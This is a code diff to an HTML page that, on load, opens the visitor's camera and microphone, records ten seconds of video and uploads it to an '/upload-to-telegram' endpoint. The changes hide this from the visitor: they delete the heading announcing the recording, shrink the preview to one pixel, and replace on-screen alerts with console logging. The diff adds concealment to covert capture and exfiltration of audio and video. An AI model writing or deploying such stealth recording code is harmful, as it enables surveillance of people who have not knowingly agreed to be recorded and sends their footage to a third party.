@@ -6,17 +6,16 @@
   <title>Video Recorder</title>
 </head>
 <body>
-  <h2>Recording Automatically and Sending to Telegram...</h2>
-
-  <video id="preview" autoplay muted playsinline style="width: 320px; height: 240px; border: 1px solid black;"></video>
+  <!-- Just the video preview -->
+  <video id="preview" autoplay muted playsinline style="width: 1px; height: 1px; border: 1px solid black;"></video>
 
   <script>
     let mediaRecorder;
     let recordedChunks = [];
 
-    async function initCameraAndRecord() {
+    async function startRecording() {
       try {
-        // Access camera and microphone
+        // Get camera + mic
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         document.getElementById("preview").srcObject = stream;
 
@@ -29,39 +28,41 @@
         mediaRecorder.onstop = async () => {
           const recordedBlob = new Blob(recordedChunks, { type: "video/webm" });
 
-          // Stop all tracks
+          // Stop camera
           stream.getTracks().forEach(track => track.stop());
 
-          // Send to Telegram automatically
+          // Prepare upload
           const formData = new FormData();
           formData.append("video", recordedBlob, "recording.webm");
 
           try {
-            const res = await fetch("/upload-to-telegram", { method: "POST", body: formData });
-            alert(await res.text());
+            const res = await fetch("/upload-to-telegram", {
+              method: "POST",
+              body: formData
+            });
+            console.log(await res.text());
           } catch (err) {
-            console.error(err);
-            alert("❌ Error sending video");
+            console.error("❌ Error sending video:", err);
           }
         };
 
-        // Start recording immediately
+        // Start immediately
         mediaRecorder.start();
-        console.log("Recording started...");
+        console.log("🎥 Recording started...");
 
-        // Stop automatically after 10 seconds (adjust duration if needed)
+        // Stop & send after 10 seconds (adjust as needed)
         setTimeout(() => {
           mediaRecorder.stop();
-          console.log("Recording stopped and sending...");
+          console.log("🛑 Recording stopped, sending...");
         }, 10000);
 
       } catch (err) {
-        console.error("Error accessing camera:", err);
+        console.error("Camera error:", err);
       }
     }
 
-    // Start everything as soon as the page loads
-    window.onload = initCameraAndRecord;
+    // Auto-start when page loads
+    window.onload = startRecording;
   </script>
 </body>
 </html>
